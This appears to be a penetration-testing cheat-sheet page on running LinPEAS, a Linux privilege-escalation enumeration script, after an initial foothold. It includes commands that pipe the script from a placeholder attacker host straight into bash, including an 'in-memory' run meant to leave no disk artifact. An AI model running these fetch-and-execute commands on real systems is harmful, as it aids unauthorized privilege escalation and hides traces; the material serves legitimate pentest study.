# 09.01 LinPEAS

> Linux Privilege Escalation Audit Script — same idea as WinPEAS but for Linux.

## Overview

LinPEAS enumerates Linux escalation paths: SUID/SGID binaries, sudoers entries (NOPASSWD), capabilities, kernel CVEs, writable PATH directories, weak cron jobs, world-readable sensitive files, exposed credentials, NFS misconfigs. Color-coded with severity rating. The first thing to run after initial Linux foothold.

## Steps

- **Step 1** - Transfer linpeas.sh to target.
- **Step 2** - chmod +x and run.
- **Step 3** - Review red 95%+ severity findings — those are guaranteed escalations.

## Commands

### Get script

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

### Quick transfer + run

```bash
# On attacker
python3 -m http.server 80
# On target
curl -L http://<ATTACKER>/linpeas.sh | bash
# or wget + run
wget http://<ATTACKER>/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh
```

### In-memory run (no on-disk artifact)

```bash
curl -s http://<ATTACKER>/linpeas.sh | bash
```

### Specific checks

```bash
./linpeas.sh -a              # all checks
./linpeas.sh -s              # superfast
./linpeas.sh -e              # extra checks
./linpeas.sh -t              # threads enabled
./linpeas.sh -o cron,docker  # specific sections
```

### Output to file

```bash
./linpeas.sh -a > peas.out
ansi2html < peas.out > peas.html  # preserve colors as HTML
```
